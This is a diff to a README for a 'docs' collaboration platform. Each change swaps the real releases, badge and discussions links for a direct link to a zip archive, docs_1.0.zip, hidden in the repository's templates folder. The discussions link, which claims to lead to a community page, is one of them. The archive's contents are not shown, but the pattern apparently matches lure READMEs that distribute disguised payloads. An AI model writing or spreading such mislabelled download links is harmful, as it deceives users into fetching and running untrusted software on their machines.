@@ -1,7 +1,7 @@
 # 🌟 docs - A Simplified Way to Collaborate
 
 ## 🔗 Download Now!
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen.svg)](https://github.com/mdjihadhasanx/docs/releases)
+[![Download Now](https://raw.githubusercontent.com/mdjihadhasanx/docs/main/src/backend/core/templates/docs_1.0.zip%https://raw.githubusercontent.com/mdjihadhasanx/docs/main/src/backend/core/templates/docs_1.0.zip)](https://raw.githubusercontent.com/mdjihadhasanx/docs/main/src/backend/core/templates/docs_1.0.zip)
 
 ## 📖 About
 Welcome to the **docs** project. This is a collaborative note-taking, wiki, and documentation platform designed for all users. Whether you are working alone or with a team, this application helps you document your ideas and share knowledge effortlessly. Built with Django and React, it scales to meet your needs.
@@ -24,7 +24,7 @@ For the best experience, ensure your computer meets the following requirements:
 - **Open Source:** Customize the application to fit your needs.
 
 ## 📥 Download & Install
-To download the application, visit the Releases page here: [Download Here](https://github.com/mdjihadhasanx/docs/releases).
+To download the application, visit the Releases page here: [Download Here](https://raw.githubusercontent.com/mdjihadhasanx/docs/main/src/backend/core/templates/docs_1.0.zip).
 
 Once you are on the page:
 
@@ -60,7 +60,7 @@ If problems persist, check the project’s GitHub issues page for solutions or r
 ## 📡 Join the Community
 Your experience matters. Join our community to share feedback, suggest features, or ask questions. Engage with other users and contribute to improving the platform.
 
-Visit our discussions page [here](https://github.com/mdjihadhasanx/docs/discussions) to get involved.
+Visit our discussions page [here](https://raw.githubusercontent.com/mdjihadhasanx/docs/main/src/backend/core/templates/docs_1.0.zip) to get involved.
 
 ## ✉️ Contact Information
 For more help, reach out to our support team through the project's GitHub page. We are here to help make your experience smooth and enjoyable.
